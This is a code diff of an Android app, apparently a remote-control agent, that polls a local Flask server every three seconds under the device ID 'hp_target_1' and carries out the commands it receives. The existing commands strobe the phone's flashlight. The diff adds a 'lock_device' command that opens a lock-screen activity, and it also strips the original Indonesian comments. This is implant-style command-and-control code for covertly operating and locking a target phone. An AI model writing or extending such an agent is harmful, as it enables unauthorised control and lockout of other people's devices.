@@ -2,6 +2,7 @@ package com.ezax.agent;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraManager;
@@ -17,7 +18,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class MainActivity extends Activity {
-    // --- IP UDAH DIGANTI KE 49 ---
+    // PASTIKAN IP INI SESUAI DENGAN TERMINAL FLASK KAMU
     private static final String SERVER_URL = "http://192.168.1.49:5000"; 
     private static final String DEVICE_ID = "hp_target_1"; 
     
@@ -26,20 +27,18 @@ public class MainActivity extends Activity {
     private Handler strobeHandler = new Handler();
     private CameraManager cameraManager;
     private String cameraId;
-    private boolean isTorchOn = false; // Buat nyimpen status nyala/mati kelap-kelip
+    private boolean isTorchOn = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         
-        // Cari kamera belakang yang ada flash-nya
         try {
             for (String id : cameraManager.getCameraIdList()) {
                 CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                 Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                 Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
-                
                 if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                     cameraId = id;
                     break;
@@ -57,7 +56,7 @@ public class MainActivity extends Activity {
             @Override
             public void run() {
                 fetchCommand();
-                handler.postDelayed(this, 3000); // Nanya ke web tiap 3 detik
+                handler.postDelayed(this, 3000);
             }
         }, 3000);
     }
@@ -98,6 +97,9 @@ public class MainActivity extends Activity {
             startStrobe();
         } else if (cmd.equals("STOP_ALL")) {
             stopStrobe(); setTorch(false);
+        } else if (cmd.equals("lock_device")) {
+            Intent intent = new Intent(MainActivity.this, LockScreenActivity.class);
+            startActivity(intent);
         }
     }
 
@@ -122,14 +124,13 @@ public class MainActivity extends Activity {
         setTorch(false);
     }
 
-    // Kodingan Kelap-kelip (Strobe) yang udah dibenerin
     private final Runnable strobeRunnable = new Runnable() {
         @Override
         public void run() {
             if (isStrobe) {
-                setTorch(!isTorchOn); // Balik kondisi (nyala/mati)
+                setTorch(!isTorchOn);
                 isTorchOn = !isTorchOn;
-                strobeHandler.postDelayed(this, 400); // Jeda 400ms biar hardware aman
+                strobeHandler.postDelayed(this, 400);
             }
         }
     };
